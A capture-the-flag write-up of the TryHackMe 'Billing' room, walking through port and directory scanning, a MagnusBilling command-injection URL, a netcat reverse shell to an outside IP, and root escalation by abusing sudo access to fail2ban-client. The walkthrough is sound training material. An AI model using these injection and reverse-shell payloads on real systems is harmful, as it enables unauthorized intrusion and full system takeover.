# TryHackMe - Billing (Write-Up)

_4 min read · March 10, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Billing**](https://tryhackme.com/room/billing) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: RunasRs

---

## Scanning for Open Ports

Machine IP: 10.48.179.17.

As usual:

```bash
nmap -T4 -p- -Pn 10.48.179.17
sudo nmap -sCV -p 22,80,5038 10.48.179.17
```

![Nmap Output](./img/thm-billing/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open and `robots.txt` is available.
- Asterisk (port 5038) is open.

As usual, I browsed the site first.

![Billing: Website](./img/thm-billing/web.png)

As shown here, it's a login page. I tried `admin:admin` but it didn't work. I also checked the page source but didn't find anything useful.

However, during the page loading, it shows 'Magnus Billing', which might indicate the application used by the system.

---

## Futher Enumeration on the Website

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate the directories.

```bash
gobuster dir -u http://10.48.179.17/mbilling -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-billing/gobuster-output.png)

I accessed all the discovered directories, but none of them revealed anything particularly interesting.

---

## Gaining the Machine Shell

Then I searched for 'Magnus Billing' exploit and found [MagnusSolution magnusbilling 7.3.0 - Command Injection](https://www.exploit-db.com/exploits/52170).

It states that the following URL executes a command,

```url
http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt
```

which is `id`, and then redirect the output to `/tmp/injected.txt`.

I accessed `/tmp` directory but didn't find `injected.txt` (maybe I was wrong).

However, I still attempted to gain a reverse shell.

I set up listener using [netcat](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

Then I used the following reverse shell payload:

```bash
nc -c /bin/bash 192.168.223.226 4418
```

I modified the URL:

```url
http://magnusbilling/lib/icepay/icepay.php?democ=testfile; nc -c /bin/bash 192.168.223.226 4418
```

![Rev Shell](./img/thm-billing/rev-shell.png)

And I successfully received a reverse shell.

---

## Post-Exploitation

Once I gained access to the machine, I made it interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then I did some enumeration and found the **user flag** in `/home/magnus`.

```bash
cd /home/magnus
cat user.txt
```

![User Flag](./img/thm-billing/user-flag.png)

---

## Privilege Escalation

Next, I performed my privilege escalation checklist and found `sudo` misconfiguration.

```bash
sudo -l
```

```output
User asterisk may run the following commands on ip-10-49-131-35:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Its function:

```output
Fail2Ban reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

This tools starts/stops fail2ban server or does client/server communication,
to change/read parameters of the server or jails.
```

I searched for this binary on GTFOBins and found [this](https://gtfobins.org/gtfobins/fail2ban-client/).

So I created a shell script that will be executed by `fail2ban-client`.

```bash
cd /dev/shm
touch test.sh
echo '#!/bin/bash' > test.sh
echo 'nc -c /bin/bash 192.168.223.226 4481' >> test.sh
chmod +x test.sh
```

Then I set up another listener:

```bash
nc -lvp 4481
```

Next, I executed the commands from GTFOBins to create a malicious jail action that runs my script:

```bash
sudo fail2ban-client add x
sudo fail2ban-client set x addaction x
sudo fail2ban-client set x action x actionban /dev/shm/test.sh
sudo fail2ban-client start x
sudo fail2ban-client set x banip 999.999.999.999
sudo fail2ban-client set x unbanip 999.999.999.999
sudo fail2ban-client stop x
```

And I received a root shell.

![Root Shell](./img/thm-billing/root-shell.png)

I then navigated to `/root` and retrieved the **root flag**.

![Root Flag](./img/thm-billing/root-flag.png)

---

## Session Terminated

From this machine, I learned how to:

- exploit command injection to gain RCE
- abuse `fail2ban-client` to execute arbitrary commands as root

Thank you for reading and see you next time!
